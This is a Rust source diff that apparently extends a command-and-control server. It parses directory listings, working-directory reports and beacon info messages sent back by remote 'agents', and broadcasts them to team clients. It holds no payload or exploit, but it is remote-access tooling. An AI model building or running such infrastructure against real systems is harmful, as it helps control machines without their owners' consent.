@@ -24,7 +24,7 @@ use tracing_appender::rolling::{RollingFileAppender, Rotation};
 
 // API module for team client communication
 mod api;
-use api::{ApiState, AgentInfo as ApiAgentInfo, create_api_router};
+use api::{ApiState, AgentInfo as ApiAgentInfo, DirEntry as ApiDirEntry, create_api_router};
 
 type ClientId = u64;
 
@@ -322,6 +322,7 @@ async fn handle_client(
         os_version: None,
         privileges: None,
         connected_at: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
+        cwd: None,
     };
     
     // Register with API state
@@ -523,6 +524,104 @@ async fn handle_client(
                                 );
                                 println!("{}", "─".repeat(60).bright_black());
                                 println!("{}", msg.bright_green());
+                                println!("{}", "─".repeat(60).bright_black());
+                                println!();
+                                
+                                // Broadcast to API clients
+                                api_state_recv.broadcast_event(crate::api::ServerEvent::CommandOutput {
+                                    agent_id: id,
+                                    output: msg.to_string(),
+                                    is_error: false,
+                                });
+                            } else if response.starts_with("__DIRLIST__:") {
+                                // Directory listing response: __DIRLIST__:path:entries
+                                let content = response.strip_prefix("__DIRLIST__:").unwrap_or("");
+                                // Parse: first part is path (up to next colon), rest is entries
+                                if let Some(colon_pos) = content.find(':') {
+                                    let path = &content[..colon_pos];
+                                    let entries_str = &content[colon_pos + 1..];
+                                    
+                                    info!("[{}] Listado de directorio: {}", id, path);
+                                    
+                                    // Parse entries
+                                    let entries: Vec<crate::api::DirEntry> = entries_str
+                                        .lines()
+                                        .filter_map(|line| {
+                                            let parts: Vec<&str> = line.split('|').collect();
+                                            if parts.len() >= 3 {
+                                                let is_dir = parts[0] == "D";
+                                                let name = parts[1].to_string();
+                                                let size = parts[2].parse::<u64>().unwrap_or(0);
+                                                Some(crate::api::DirEntry { name, is_dir, size })
+                                            } else {
+                                                None
+                                            }
+                                        })
+                                        .collect();
+                                    
+                                    // Update agent's cwd
+                                    let api_state = api_state_recv.clone();
+                                    let path_clone = path.to_string();
+                                    tokio::spawn(async move {
+                                        api_state.update_agent_info(id, |agent| {
+                                            agent.cwd = Some(path_clone);
+                                        }).await;
+                                    });
+                                    
+                                    if verbose {
+                                        println!("{} {} {}", 
+                                            "📂".bright_cyan(), 
+                                            format!("[{}]", id).bright_cyan().bold(),
+                                            format!("Directorio: {} ({} items)", path, entries.len()).bright_white()
+                                        );
+                                    }
+                                    
+                                    // Broadcast directory listing to API clients
+                                    api_state_recv.broadcast_event(crate::api::ServerEvent::DirectoryListing {
+                                        agent_id: id,
+                                        path: path.to_string(),
+                                        entries,
+                                    });
+                                }
+                            } else if response.starts_with("__CWD__:") {
+                                // Current working directory response
+                                let cwd = response.strip_prefix("__CWD__:").unwrap_or("");
+                                info!("[{}] CWD: {}", id, cwd);
+                                
+                                // Update agent's cwd
+                                let api_state = api_state_recv.clone();
+                                let cwd_clone = cwd.to_string();
+                                tokio::spawn(async move {
+                                    api_state.update_agent_info(id, |agent| {
+                                        agent.cwd = Some(cwd_clone);
+                                    }).await;
+                                });
+                                
+                                if verbose {
+                                    println!("{} {} {}", 
+                                        "📁".bright_green(), 
+                                        format!("[{}]", id).bright_cyan().bold(),
+                                        format!("CWD: {}", cwd).bright_white()
+                                    );
+                                }
+                                
+                                // Broadcast cwd change to API clients
+                                api_state_recv.broadcast_event(crate::api::ServerEvent::CwdChanged {
+                                    agent_id: id,
+                                    cwd: cwd.to_string(),
+                                });
+                            } else if response.starts_with("__INFO__:") {
+                                // Info message (like beacon config confirmation)
+                                let msg = response.strip_prefix("__INFO__:").unwrap_or(&response);
+                                info!("[{}] Info: {}", id, msg);
+                                println!();
+                                println!("{} {} {}", 
+                                    "ℹ️ ".bright_cyan(), 
+                                    "Info de".bright_white().bold(),
+                                    format!("[{}]:", id).bright_cyan().bold()
+                                );
+                                println!("{}", "─".repeat(60).bright_black());
+                                println!("{}", msg.bright_cyan());
                                 println!("{}", "─".repeat(60).bright_black());
                                 println!();
                                 
